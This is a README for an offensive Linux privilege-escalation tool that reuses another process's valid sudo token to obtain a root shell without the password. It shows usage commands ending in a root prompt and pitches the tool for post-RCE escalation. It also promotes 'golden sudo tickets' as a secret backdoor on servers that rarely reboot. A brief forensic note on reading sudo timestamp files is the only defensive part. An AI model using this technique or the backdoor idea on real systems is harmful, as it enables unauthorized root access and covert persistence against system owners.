# [Linux] Privilege Escalation by injecting process posseding sudo tokens.

#### Inject process that have valid sudo token and activate our own sudo token.

## How to use
```sh
$ sudo whatever
[sudo] password for user:    # Press <ctrl>+c since you don't have the password. # This creates an invalid sudo tokens.
$ ./exploit.sh # This activates our sudo token.
.... wait 3 seconds
$ sudo -i # no password required :)
# uid=0(root) gid=0(root) groups=0(root)
```

## Requirements
A currently living process that has a valid sudo token with the same uid.
```
The default password timeout is 15 minutes. So if you use sudo twice in 15 minutes (900 seconds), you will not be asked to type the user’s password again.
```
## Usecase

This is far from a generic privesc without requirements but it works, for instance if you have a RCE and don't have the user password but the user uses sudo then you can easily get root by stealing his token.

## More

### Forensic, DFIR ?

To be improved but for each sudo attemps there is an entry added to /var/run/sudo/ts/[username]
```sh
./read_sudo_token_forensic  < /var/run/sudo/ts/user
version, flags, uid, sid, starttime_sec, starttime_nsec
2, 0, 0, 0, 0, 0
2, 0, 1001, 1145, 188, 660000000
2, 0, 1001, 24878, 7461, 490000000
2, 0, 1001, 24578, 6974, 10000000
```

### Golden sudo tickets

A very good way to leave a secret backdoor on servers that rarely reboots.
No done yet but checkout './write_sudo_token $$' in ./extra_tools

### Why

I was looking for a way to steal dead process sudo token, but it doesn't look possible because they are associated by ((process start time and process session id) or (tty start time and tty session id)), and everything can be impressionnated except the start times which are relative to system boot time.

----
By [@chaignc][] [#HexpressoTeam][hexpresso].


[hexpresso]:     https://hexpresso.github.io
[@chaignc]:    https://twitter.com/chaignc
